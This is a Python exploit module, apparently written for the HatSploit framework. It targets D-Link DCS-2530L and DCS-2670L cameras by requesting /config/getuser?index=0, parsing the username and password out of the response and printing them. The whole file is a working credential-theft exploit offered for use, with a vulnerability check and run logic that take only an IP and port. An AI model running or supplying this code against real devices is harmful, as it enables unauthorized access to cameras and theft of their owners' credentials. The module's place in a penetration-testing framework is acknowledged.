#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.utils.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    details = {
        'Name': "D-Link DCS Credentials Disclosure",
        'Module': "exploit/linux/dlink/dcs_credentials_disclosure",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "D-Link DCS-2530L < 1.06.01 and DCS-2670L <= 2.02 credentials disclosure exploit.",
        'Comments': [
            ''
        ],
        'Platform': "linux",
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True
        }
    }

    def exploit(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/config/getuser?index=0'
        )

        if 'name' in response.text and 'pass' in response.text:
            username = response.text.split('\n')[0].split('=')[1]
            password = response.text.split('\n')[1].split('=')[1]

            self.print_table("Credentials", ('Username', 'Password'), (username, password))
        else:
            self.output_warning("Target vulnerable, but no credentials found.")

    def check(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/config/getuser?index=0'
        )

        if not response or response.status_code != 200:
            self.output_error("Target is not vulnerable!")
            return False

        return True

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.output_process(f"Exploiting {remote_host}...")

        if not self.check(remote_host, remote_port):
            self.output_error("Exploit failed!")
            return

        self.exploit(remote_host, remote_port)
